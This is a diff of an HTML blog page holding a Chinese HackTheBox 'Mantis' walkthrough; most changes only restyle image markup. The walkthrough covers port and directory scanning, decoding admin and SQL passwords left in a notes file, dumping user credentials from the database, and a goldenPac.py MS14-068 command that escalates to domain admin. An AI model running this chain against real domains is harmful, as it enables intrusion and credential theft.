@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;98  10.10.10.52   端口扫描需要全端口扫描，用到的1337端口默认扫不到： 1234567891011121314151617181920212223242526272829303132333435$ nmap -p- 10.10.10.52Starting Nmap 7.91">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;98  10.10.10.52                                                                                                              端口扫描需要全端口扫描，用到的1337端口默">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mantis - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/11/18/Mantis-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;98  10.10.10.52   端口扫描需要全端口扫描，用到的1337端口默认扫不到： 1234567891011121314151617181920212223242526272829303132333435$ nmap -p- 10.10.10.52Starting Nmap 7.91">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;98  10.10.10.52                                                                                                              端口扫描需要全端口扫描，用到的1337端口默">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111803.jpg">
@@ -130,7 +130,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -220,37 +220,107 @@
 </li>
 <li><h2 id="10-10-10-52"><a href="#10-10-10-52" class="headerlink" title="10.10.10.52"></a>10.10.10.52</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>需要全端口扫描，用到的1337端口默认扫不到：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- 10.10.10.52</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-18 13:39 CST</span><br><span class="line">Nmap scan report for 10.10.10.52</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">Not shown: 65508 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">1337/tcp  open  waste</span><br><span class="line">1433/tcp  open  ms-sql-s</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5722/tcp  open  msdfsr</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49152/tcp open  unknown</span><br><span class="line">49153/tcp open  unknown</span><br><span class="line">49154/tcp open  unknown</span><br><span class="line">49155/tcp open  unknown</span><br><span class="line">49157/tcp open  unknown</span><br><span class="line">49158/tcp open  unknown</span><br><span class="line">49164/tcp open  unknown</span><br><span class="line">49165/tcp open  unknown</span><br><span class="line">49168/tcp open  unknown</span><br><span class="line">50255/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 903.78 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>是一个Orchard Blog：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>任意构造404能够得到login链接：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111803.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="1337"><a href="#1337" class="headerlink" title="1337"></a>1337</h2><p>直接访问是IIS默认页面：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111805.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>1337端口目录扫描，得到一个目录：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br><span class="line">...</span><br><span class="line">/secure_notes (Status: 301)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="dev-notes"><a href="#dev-notes" class="headerlink" title="dev_notes"></a>dev_notes</h2><p>这个是OrchardCMS相关文档，里面有admin密码信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt</span><br><span class="line"></span><br><span class="line">1. Download OrchardCMS</span><br><span class="line">2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database</span><br><span class="line">3. Launch IIS and add new website and point to Orchard CMS folder location.</span><br><span class="line">4. Launch browser and navigate to http://localhost:8080</span><br><span class="line">5. Set admin password and configure sQL server connection string.</span><br><span class="line">6. Add blog pages with admin user.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里中间很多空行，页面最下面还有</span></span><br><span class="line">Credentials stored in secure format</span><br><span class="line">OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001</span><br><span class="line">SQL Server sa credentials file namez</span><br></pre></td></tr></table></figure>
 
 <h2 id="blog-admin-password"><a href="#blog-admin-password" class="headerlink" title="blog admin password"></a>blog admin password</h2><p>上面得到的是密码的二进制形式，解码得到密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@dm!n_P@ssW0rd!</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111809.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>但这个管理界面没什么可利用的地方：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111810.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111810.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="sql-password"><a href="#sql-password" class="headerlink" title="sql password"></a>sql password</h2><p>另外这个文件名base64 hex解码后得到的就是数据库密码,用户名是admin：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m$$ql_S@_P@ssW0rd!</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111807.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111808.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="orcharddb"><a href="#orcharddb" class="headerlink" title="orcharddb"></a>orcharddb</h1><p>然后连接数据库查看信息，得到用户名密码信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM master.dbo.sysdatabases;</span><br><span class="line">SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES;</span><br><span class="line">SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS;</span><br><span class="line">USE orcharddb;</span><br><span class="line">SELECT * FROM blog_Orchard_Users_UserPartRecord;</span><br><span class="line"></span><br><span class="line">james@htb.local james J@m3s_P@ssW0rd!</span><br></pre></td></tr></table></figure>
 
@@ -267,11 +337,25 @@
 <p>可以一步步来，也可以直接用impacket自带的goldenPac.py一键打：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111811.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111811.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h1><p>然后直接去读取user.txt和root.txt:</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\james\desktop\user.txt</span><br><span class="line">type C:\Users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111812.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020111812.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>（转）MS14-068域内提权漏洞总结 - 渗透测试中心 - 博客园<br><a href="https://www.cnblogs.com/backlion/p/6820744.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/6820744.html</a></li>
 <li>HTB: Mantis | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2020/09/03/htb-mantis.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2020/09/03/htb-mantis.html</a></li>
